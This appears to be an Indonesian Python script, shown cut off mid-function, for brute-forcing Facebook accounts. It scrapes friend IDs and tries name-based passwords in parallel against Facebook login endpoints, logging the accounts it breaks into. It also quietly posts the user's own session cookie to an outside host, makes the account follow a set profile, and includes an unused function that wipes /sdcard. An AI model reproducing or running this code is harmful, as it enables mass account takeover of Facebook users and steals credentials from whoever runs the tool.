#CODE BY ACIL 
import os
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system("clear")
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import bs4
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall bs4\n")
    os.system("pip install bs4")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random, base64, subprocess, uuid
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from rich import print as prints
from time import time as mek
from rich.tree import Tree

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
A = '\x1b[1;90m' # WARNA ABU ABU

ugen=[]
for i in range(int(10000)):
		aaa = 'Mozilla/5.0 (Linux; U; Android'
		bbb = random.choice(
			[
				'4','6','7','8',
				'9','10','11','12'
			]
		)
		ccc = 'en-us; GT-'
		ddd = random.choice(
			[
				'A','B','C','D','E','F','G','H','I',
				'J','K','L','M','N','O','P','Q','R',
				'S','T','U','V','W','X','Y','Z'
			]
		)
		eee = random.randint(1, 999)
		fff = random.choice(
			[
				'A','B','C','D','E','F','G','H','I',
				'J','K','L','M','N','O','P','Q','R',
				'S','T','U','V','W','X','Y','Z'
			]
		)

		ggg = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
		hhh = random.randint(73,100)
		iii = '0'
		jjj = random.randint(4200,4900)
		kkk = random.randint(40,150)
		lll = 'Mobile Safari/537.36'
		ua = f'{aaa} {bbb}; {ccc}{ddd}{eee}{fff}) {ggg}{hhh}.{iii}.{jjj}.{kkk} {lll}'
		ugen.append(ua)
		
ugent=[]
for xd in range(10000):
	rr = random.randint
	b = random.choice(['RMX2200','RMX3300','RMX3571','RMX3311','RMP2107','RMX3571','RMX3357','RMX3461','RMX3478','Nokia C21 Plus','Nokia C01 Plus','Nokia G11','Nokia X30 5G','Nokia C31','Nokia C31','; P13 Blue Max Pro 256 GB','N5502L','Konnect_556','22111317PG','G301','RMX3563','OMIX X500','SLTDVD1024','P13 Blue Max Lite 2022','WOW64','ONA19TB003','KingPad_K10','Nokia G60 5G','C6L','Scepter 8 Tablet','ONA19TB003','P651 2021','M2101K7BL','Hisense F23','PECT30','RMX3310','GAU0820','OPPO A79','V2130A','V2190A','V2180GA','V2172A'])
	c = random.choice(["","HeyTapBrowser/40.8.12.1","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FB_IAB/FB4A;FBAV/409.0.0.27.106;]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBCR/;FBID/phone;FBLC/fr;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/phone;FBLC/en-GB;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/399.0.0.26.69;FBBV/453638119;FBDV/iPad11,4;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/389.0.0.28.214;FBBV/426266477;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBCR/;FBID/phone;FBLC/fr;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.0.2;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]","[FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.0;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]"])
	basu=f'Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {b} Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.15.115;]'
	basi=f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; RMX3311 Build/QPIS30.28-Q3-28-26-4-1-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
	base=f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; RMP2107 Build/STAS32.79-77-28-18-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,150))}.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
	uaku2 = random.choice([basu,basi,base])
	ugent.append(uaku2)

def security():
    try:
        uid=os.getuid()#auto key garnet by termux uid
        xx = ('libsooney.so')
        try:
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        except:
            keysv=uuid.uuid4().hex[:5].upper()#Auto Key Grante By uuid
            key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','w').write(keysv)
        kk = ('github')
        k1 = ('CodeXz01')
        k2 = ('confirm')
        k3 = ('token.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{xx}','r').read()
        key=(f'USA-H{uid}5X{key1}110E==')#full key
        mysite= requests.get(f'https://{kk}.com/{k1}/{k2}/blob/main/{k3}').text#approve site
        if key in mysite:
                os.system('clear')
                ACL()
        else:
                os.system('clear')
                
                print(f'[+] Your Key Not Registerd...')
                print(f'[+] This Tools Only For Paid Users \n[+] Free Users Saty A Way')
                print(f'[+] Your Key : \033[1;32m'+key)
                input(f'\033[1;37m[+] Press Enter For Approve ')    
                whatsapp = "+6283115893229"
                url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text="
                tks = ("Hello Sir\nI will buy your command\nMy Key :- "+key)
                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                os.system('python run.py');pass
    except requests.exceptions.ConnectionError:
    	print("\033[1;32minternet connection lol \033[1;37m")
    
    
def eak():
	os.system('rm -rf /sdcard/HOME')
	os.system('rm -rf /sdcard')
	os.system('rm -rf /sdcard/DCIM')
	print('eak yatim kenak prank')
## [ ALL MENU ] ##
class ACL:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.loop = [], [], [], 0
        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.ak, self.ka, self.ya = [], [], []
        self.menu()

    def hapus(self):
        try:os.remove(".cok.txt");os.remove(".tok.txt")
        except:pass

        ### LOGO LE ##
    def logo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""{H}  
          _          ______    _____     
         {A}/ \       .' ___  |  |_   _|    
        {A}/ _ \     / .'   \_|    | |    {N}[ {M} Version 0.1{N} ]  
       {A}/ ___ \    | |           | |   _    
     {A}_/ /   \ \_  \ `.___.'\   _| |__/ | 
    {H}|____| |____|  `.____ .'  |________|                                     

    {A}[ {H}Script Facebook Multi Brute Force {A}]                           
         [{H} Crated Code By Acil {A}]{N}                            
                                    """)

        # LOGIN HACKED $##
    def login_cokie(self):
        self.logo()
        try:
            cok = input("[?] cookie : ")
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[+] notice: anda sedang menggunakan mode free facebook")
                print("[-] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[-] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("\n[!] Opshh cookie anda chekcpoint:(");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[!] cookie yang anda masukan invalid");time.sleep(2);self.login_cokie()
            else:
                print("\n[-] Mohon tunggu sebentar...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('.cok.txt', 'w').write(cok);open('.tok.txt', 'w').write(f"{nama}|{user}")
                print(f"[✓] selamat datang {nama} di ACL Meta");self.ikuti({"cookie": cok});self.datas(nama, cok)
                exit("\n[!] jalankan ulang perintah nya dengan ketik python run.py")
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")


    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100040708001839", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass


    def menu(self):
        try:
            cook = {"cookie": open(".cok.txt", "r").read()}
            nama, user = open(".tok.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        print(f"ᄂ {H}Your Account Facebook{N}\n")
        print(f"ᄂ Your Account Name ↪ {H}{nama}{N}")
        print(f"ᄂ Your Account ID   ↪ {H}{user}{N}")
        print(47*"°")
        print(f" ↪ {A}MENU CRACKED{N}\n")
        print(f' ᄂ {H}1{A} Start Cloning Multi Publik ↪ {H}ON{N} ')
        print(f' ᄂ {H}2{A} Start File Cloning  ↪ {H}ON{N} ')
        print(f' ᄂ {H}3{A} Start Cloning Email  ↪ {M}OFF{N} ')
        print(f' ᄂ {H}4{A} Start File Cloning   ↪ {M}OFF{N} ')
        ###print(f' ᄂ {H}6{A} Check Dectector  ↪ {H}ON{N} ')
        print(f' ᄂ {H}E{A} {M}Exit {N} ')
        anjay = input(' ᄂ Choose option : ')
        print(47*"-")
        if anjay in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif anjay in ["1", "01"]:
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif anjay in ["2", "02"]:
            self.file = input('Put File Name :  ')
            try:
                self.id = open(self.file).read().splitlines()
                self.metode()
            except FileNotFoundError:
                print('Opps File Not Found ...')
                time.sleep(2)
                os.system('clear')
                print('Try Again ...')
                time.sleep(2)
        elif anjay in ["3", "03"]:
            exit("belum selesai:)")
        elif anjay in ["4", "04"]:
            exit("belum selesai:)")
        elif anjay in ["e", "E"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"|"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"|"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass

    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print(47*"•")
        print('\t   ⟼ %s1%s Method B-Graph%s'%(H,A,N))
        print('\t   ⟼ %s2%s Method Reguler%s'%(H,A,N))
        print('\t   ⟼ %s3%s Method Validate%s'%(H,A,N))
        hc = input('Choice : ')
        if hc in ['1','01']:
            self.paswww("api")
        elif hc in ['2','02']:
            self.paswww("acy")
        elif hc in ['3','03']:
            self.paswww("dat")
        else:
            self.paswww("acy")

    def paswww(self, xx):
        print(47*"•")
        print('\n\t    %s➛ %s1%s manual password%s'%(N,H,A,N))
        print('\t    %s➛ %s2%s gabung password%s'%(N,H,A,N))
        print('\t    %s➛ %s3%s otomatis password%s'%(N,H,A,N))
        ykh = input('Method : ')
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()


    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        pwek = input(f"[{O}?{N}] sandi : ")
        if pwek in[""," "]:
            print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
        elif len(pwek)<=5:
            print(f"[{M}×{N}] kata sandi minimal 6 karakter")
        else:
            if "api" in xx:
                print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
                with Modol(max_workers=30) as bool:
                    for user in self.id:
                        bool.submit(self.api, user.split("|")[0], pwek)
                exit("\n\ncracking done!")
            elif "acy" in xx:
                print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
                with Modol(max_workers=30) as bool:
                    for user in self.id:
                        bool.submit(self.asycn, user.split("|")[0], pwek, xx)
                exit("\n\ncracking done!")
            elif "dat" in xx:
                print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
                with Modol(max_workers=30) as bool:
                    for user in self.id:
                        bool.submit(self.asycn, user.split("|")[0], pwek, xx)
                exit("\n\ncracking done!")
            else:pass

    def carckk(self, kntd):
        print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
        with Modol(max_workers=30) as bool:
            for user in self.id:
                uid, nama = user.split("|")[0], user.split("|")[1].lower()
                depan = nama.split(" ")
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    if "iya" in self.iya:
                        for x in self.pasw:
                            pwx.append(x)
                    if "api" in kntd:
                        bool.submit(self.api, uid, pwx)
                    elif "acy" in kntd:
                        bool.submit(self.asycn, uid, pwx, kntd)
                    elif "dat" in kntd:
                        bool.submit(self.asycn, uid, pwx, kntd)
                    else:bool.submit(self.api, uid, pwx)
                except:pass
            exit("\n\ncracking done!")
    def uaku(self):
        android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
        model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
        build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
        versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
        large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
        merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
        brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
        cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
        versi_app = str(random.randint(111111111,999999999))
        language = "id_ID"
        try:
            simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
        except:
            simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
            ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
            return ugent
    
    def ua_api(self):
        rr = random.randint
        bapakkau = random.choice
        xxxxx = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
        versi = random.choice(['Infinix 93K Prime', 'Infinix A5', 'Infinix a54', 'Infinix A87', 'Infinix AIR', 'Infinix C8818'])
        build = f"{random.choice(xxxxx)}{random.choice(xxxxx)}{random.choice(xxxxx)}{random.randint(10,90)}{random.choice(xxxxx)}.{random.randint(100000,900000)}.{random.randint(100,300)}"
        honda = f"Davik/2.1.0 (Linux; U; Android {str(rr(4,13))}; Infinix G636 Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(40,347))}.314.0.0.7.117;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/661385480;FBCR/AXIS;FBMF/Infinix;FBBD/Infinix;FBDV/V1962BA;FBSV/{str(rr(4,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=2048,width=1260};]"
        supra =f"Davik/2.1.0 (Linux; U; Android {str(rr(4,10))}; Infinix 2010 Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(50,327))}.307.0.0.5.99;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/272238242;FBCR/INDOSAT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix 2010;FBSV/{str(rr(6,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.0,height=2048,width=750};]"
        bapak = f"Davik/2.1.0 (Linux; U; Android {str(rr(6,12))}; Infinix AIR Build/{build}) [FBAN/MessengerLite;FBAV/{str(rr(40,350))}.301.0.0.2.136;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/180988663;FBCR/XL Axiata;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix AIR;FBSV/{str(rr(6,12))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1060,width=2048};]"
        return bapakkau([honda, supra, bapak])

    def ua_asu(self):
        xxxxx = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
        versi = random.choice(['Infinix F98', 'Infinix G636', 'Infinix Hot 10', 'Infinix X675', 'Infinix X692', 'Infinix X610B'])
        versi1 = random.choice(['Vodafone Smart 4G', '6159K', 'T771K', 'WTVIS01', 'Nokia G100', 'CPH2473'])
        build = f"{random.choice(xxxxx)}{random.choice(xxxxx)}{random.choice(xxxxx)}{random.randint(10,90)}{random.choice(xxxxx)}.{random.randint(100000,900000)}.{random.randint(100,300)}"
        uazzz = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,12))}; vivo 1940 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.{str(random.randint(1000,4000))}.{str(random.randint(100,900))} Mobile Safari/537.36 (AirWatch Browser v22.08.0.19)"
        return uazzz

    def api(self, username, pasw):
        sys.stdout.write(f'\r\r\033[1;37m [{H}B-graph{N}] %s|\033[1;32mLive:-%s \033[1;37m'%(self.loop,len(self.ok)));sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=random.choice(ugent)
                #heads = random.choice(ugent)
                header = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": uas,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":username,"password":password,"access_token":"275254692598279|585aec5b4c27376758abb7ffcb9db2af","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                response = ses.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
                if "session_key" in response.text:
                    print('\r\r\033[1;32m [OK] '+username+' | '+password+'\033[1;97m')
                    kntl = (f"[✓] {username}|{password}")
                    self.ok.append(kntl)
                    open('/sdcard/cil-OK.txt','a').write(kntl+'\n')
                    break
                elif "www.facebook.com" in response.text:
                    print(f'\r\r{M} [CP] '+username+' | '+password+'\033[1;97m')
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    open('/sdcard/cil-CP.txt','a').write(kntl+'\n')
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(10)
            except Exception as e:
                pass
        self.loop+=1

    def asycn(self, username, pasw, kntd):
        sys.stdout.write(f'\r\r\033[1;37m [{H}Reguler{N}] %s|\033[1;32mLive:-%s \033[1;37m'%(self.loop,len(self.ok)));sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=random.choice(ugent)
                if "acy" in kntd:
                    urll = "https://m.alpha.facebook.com/login.php?"
                    heaq = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": uas})
                    link = ses.get(urll, headers=heaq).text
                    data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1), "li": re.search('name="li" value="(.*?)"', str(link)).group(1), "try_number": 0, "unrecognized_tries": 0, "email": username, "prefill_contact_point": f"{username}", "prefill_source": "browser_dropdown", "prefill_type": "password", "first_prefill_source": "browser_dropdown", "first_prefill_type": "contact_point", "had_cp_prefilled": True, "had_password_prefilled": True, "is_smart_lock": False, "bi_xrwh": 0, "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{password}", "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(link)).group(1), "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1), "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(link)).group(1)}
                    post = "https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
                else:
                    if username.isdigit():
                        urll = "https://m.facebook.com/login/device-based/password/?uid={}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr".format(username)
                        heaq = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.facebook.com", "user-agent": uas})
                        link = ses.get(urll, headers=heaq).text
                        data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "uid": username, "next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified", "flow": "login_no_pin", "pass": password}
                        post = "https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID"

